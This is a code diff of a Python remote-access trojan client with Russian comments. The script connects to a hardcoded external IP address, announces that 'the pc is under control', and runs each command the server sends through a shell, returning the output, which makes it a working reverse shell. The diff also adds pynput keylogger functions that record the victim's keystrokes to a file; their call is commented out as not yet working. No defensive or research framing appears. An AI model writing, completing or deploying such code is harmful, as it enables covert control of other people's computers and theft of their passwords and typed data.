@@ -3,11 +3,25 @@ import time
 import datetime
 import os
 import subprocess
+from pynput.keyboard import Listener
 """
 Также как и на серверной стороне, здесь будут фигурировать внутренние локальные IP, которые 
 можно посмотреть в ipconfig в cmd.
-Далее и на клиентской стороне сперва надо создать сокет. Если же у нас деплой, тогда ip внешний сервера. 
+Далее и на клиентской стороне сперва надо создать сокет. 
 """
+
+#две функции ниже это key логгеры
+def write(key):
+    keydata = str(key)
+    #print(keydata)
+    #keydata.replace("'", " ") '''123```
+    with open("keylog.txt", "a") as f:
+        f.write(keydata)
+
+def start_logger():
+    #очень странный механизм запуска но тем не менее
+    with Listener(on_press=write) as l:
+        l.join()
 
 def despatch(ip, port, message):
     """
@@ -42,6 +56,11 @@ def accept_attack(ip, port):
     sock.connect((ip, port))
     #дописать в лог айпи атакованной машины и ее порт
     sock.send(("The pc is under control").encode())
+
+    #как только жертва под контролем начинаем писать лог нажатий
+    #на текущем этапе не работает, запускать в соседнем треде, что бы основной не блокировался
+    #start_logger()
+
     while True:
         data = sock.recv(1024)
         print(data.decode(), ": incoming answer from server")
@@ -56,19 +75,18 @@ def accept_attack(ip, port):
                     sock.send(os.getcwd().encode())
                 except Exception as e:
                     print(e)
-        else:
-            #далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
-            #шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
-            #и в стдартном вводе, выводе, ошибке пишем subprocess.PIPE (наверное для конвертации всего в строку)
-            cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            else:
+                #далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
+                #шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
+                #и в стдартном вводе, выводе, ошибке пишем subprocess.PIPE (наверное для конвертации всего в строку)
+                cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
-            #далее пишем ответ консоли в перменную (не конвертируем так как ответ в байтах, и слать тоже надо байты)
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            #на всякий случай заимеем ответ также в виде строки
-            output_string = str(output_bytes, "cp866")
+                #далее пишем ответ консоли в перменную (не конвертируем так как ответ в байтах, и слать тоже надо байты)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                #на всякий случай заимеем ответ также в виде строки
+                output_string = str(output_bytes, "cp866")
 
-            sock.send(output_bytes)
+                sock.send(output_bytes)
     sock.close()
 
-#despatch("109.237.25.179", 9090, "HELLO WORLD")
 accept_attack("109.237.25.179", 9090)
